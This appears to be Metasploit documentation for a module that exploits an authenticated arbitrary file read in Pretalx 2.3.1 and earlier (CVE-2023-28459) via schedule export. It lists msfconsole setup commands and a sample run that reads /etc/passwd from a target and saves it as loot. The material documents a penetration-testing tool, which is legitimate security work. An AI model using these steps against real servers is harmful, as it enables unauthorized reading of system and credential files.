## Description

This module exploits functionality in Pretalx that export conference schedule as zipped file. The Pretalx will iteratively include any file referenced by any HTML tag and does not properly check the path of the file, which can lead to arbitrary file read. The module requires crendetials that allow schedule export, schedule release and approval of proposals. Additionaly, module requires conference name and URL for media files.

## Vulnerable Application
Pretalx is an open-source conference scheduling tool that allows organizers to manage event schedules, speakers, and submissions.

The vulnerability exploited by this module exists in Pretalx versions up to 2.3.1, where the export functionality of conference schedules as zipped files improperly handles paths in HTML tags. This allows an authenticated user with proper permissions to read arbitrary files on the server by referencing them in exported schedules.

Vulnerable versions: Pretalx ≤ 2.3.1

Vulnerability: Arbitrary file read through schedule export

Source code: https://github.com/pretalx/pretalx

Exploit requires: Valid credentials with permissions to export schedules, release schedules, and approve proposals.

More info: CVE-2023-28459

## Verification Steps
1. Install a vulnerable Pretalx instance (version ≤ 2.3.1). You can follow the official installation guide: https://docs.pretalx.org/en/latest/install/

2. Start msfconsole.

3. Load the module with:

```
use auxiliary/scanner/http/pretalx_file_read
```
4. Set required options:
```
set RHOSTS <target_ip>
set USERNAME <valid_username>
set PASSWORD <valid_password>
set CONFERENCE_NAME <conference_slug>
set FILEPATH /etc/passwd
set MEDIA_URL /media
```
5. Run the module:
```
run
```
On success, the module will store the contents of the targeted file as loot.

## Scenarios
```
msf6 > use auxiliary/scanner/http/pretalx_file_read
msf6 auxiliary(scanner/http/pretalx_file_read) > set RHOSTS 192.168.1.10
msf6 auxiliary(scanner/http/pretalx_file_read) > set USERNAME admin
msf6 auxiliary(scanner/http/pretalx_file_read) > set PASSWORD password123
msf6 auxiliary(scanner/http/pretalx_file_read) > set CONFERENCE_NAME myconf
msf6 auxiliary(scanner/http/pretalx_file_read) > set FILEPATH /etc/passwd
msf6 auxiliary(scanner/http/pretalx_file_read) > run

[+] Stored results in /path/to/.msf4/loot/...

```


